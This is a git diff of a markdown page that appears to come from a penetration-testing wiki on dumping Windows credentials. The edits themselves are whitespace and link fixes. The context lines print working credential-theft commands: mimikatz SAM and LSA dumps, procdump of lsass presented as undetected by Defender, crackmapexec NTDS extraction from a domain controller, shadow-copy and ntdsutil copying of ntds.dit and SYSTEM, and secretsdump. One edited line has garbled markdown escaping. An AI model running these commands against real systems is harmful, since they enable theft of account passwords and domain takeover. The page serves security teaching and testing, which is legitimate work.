@@ -50,7 +50,7 @@ mimikatz_command -f "lsadump::sam"
 
 ### Procdump + Mimikatz
 
-As **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**is a legitimate Microsoft tool**, it's not detected by Defender.   
+As **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**is a legitimate Microsoft tool**, it's not detected by Defender.  
 You can use this tool to **dump the lsass process**, **download the dump** and **extract** the **credentials locally** from the dump.
 
 {% code title="Dump lsass" %}
@@ -112,7 +112,7 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
 
-### Dump the NTDS.dit password history from target DC 
+### Dump the NTDS.dit password history from target DC
 
 ```text
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
@@ -161,7 +161,6 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYS
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit
 ```
 
-  
 But you can do the same from **Powershell**. This is an example of **how to copy the SAM file** \(the hard drive used is "C:" and its saved to C:\users\Public\) but you can use this for copying any protected file:
 
 ```bash
@@ -216,7 +215,7 @@ Available since Windows Server 2008.
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
 
-You could also use the [**volume shadow copy**](./#stealing-sam-and-system) ****trick to copy the **ntds.dit** file. Remember that you will also need a copy of the **SYSTEM file** \(again, [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system) ****trick\).
+You could also use the [**volume shadow copy**](./#stealing-sam-and-system) **\*\*trick to copy the** ntds.dit **file. Remember that you will also need a copy of the** SYSTEM file **\(again, \[**dump it from the registry or use the volume shadow copy**\]\(./\#stealing-sam-and-system\) \*\***trick\).
 
 ### **Extracting hashes from NTDS.dit**
 
@@ -234,7 +233,7 @@ secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 
 For **big NTDS.dit files** it's recommend to extract it using [gosecretsdump](https://github.com/c-sto/gosecretsdump).
 
-Finally, you can also use the **metasploit module**: _post/windows/gather/credentials/domain\_hashdump_ or **mimikatz** `lsadump::lsa /inject` 
+Finally, you can also use the **metasploit module**: _post/windows/gather/credentials/domain\_hashdump_ or **mimikatz** `lsadump::lsa /inject`
 
 ## Lazagne
 
@@ -271,7 +270,7 @@ type outpwdump
 
 ### PwDump7
 
-Download it from:[ http://www.tarasco.org/security/pwdump\_7](%20http://www.tarasco.org/security/pwdump_7) and just **execute it** and the passwords will be extracted.
+Download it from:[ http://www.tarasco.org/security/pwdump\_7](https://github.com/securityPirate/hacktricks/tree/5ef7799045a598c737b8284ae234c8a317879b7f/security/pwdump_7/README.md) and just **execute it** and the passwords will be extracted.
 
 ## Defenses
 
